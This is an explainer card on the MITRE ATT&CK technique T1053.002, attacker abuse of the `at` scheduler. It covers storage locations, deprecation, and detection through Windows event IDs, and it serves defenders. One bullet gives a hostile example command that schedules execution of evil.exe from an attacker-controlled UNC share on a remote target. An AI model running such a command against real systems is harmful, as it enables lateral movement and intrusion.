# T1053.002

## What it is
Like a night-shift janitor who leaves a note saying "clean the floors every Tuesday at 2 AM," `at` is a legacy Windows/Unix job scheduler that runs commands at a specified time — once or repeatedly — without needing anyone present. Precisely, T1053.002 describes adversary abuse of the `at` command-line utility to schedule malicious tasks for persistence, privilege escalation, or lateral movement.

## Why it matters
During the infamous APT1 campaign, threat actors used `at` jobs to schedule execution of backdoors and data exfiltration scripts during off-hours, making detection harder since activity blended with routine maintenance windows. Defenders who only monitor Task Scheduler GUI or `schtasks` entries will miss `at`-registered jobs entirely, since they appear in a separate legacy store on older Windows systems.

## Key facts
- On Windows, `at` jobs are stored in `C:\Windows\System32\Tasks` or the legacy `%SystemRoot%\System32\At*.job` format and require Administrator privileges to schedule
- `at` was deprecated in Windows 8/Server 2012 but remains present and functional on many systems for backward compatibility
- On Linux/Unix, `at` jobs land in `/var/spool/at/` and run under the scheduling user's context — a root-scheduled job escalates impact significantly
- Detection focus: monitor Event ID **4698** (task created) and **4702** (task updated) in Windows Security logs, plus process creation logs for `at.exe`
- Attackers often combine `at` with a UNC path payload (e.g., `at \\target 02:00 cmd /c \\attacker\share\evil.exe`) to achieve lateral movement
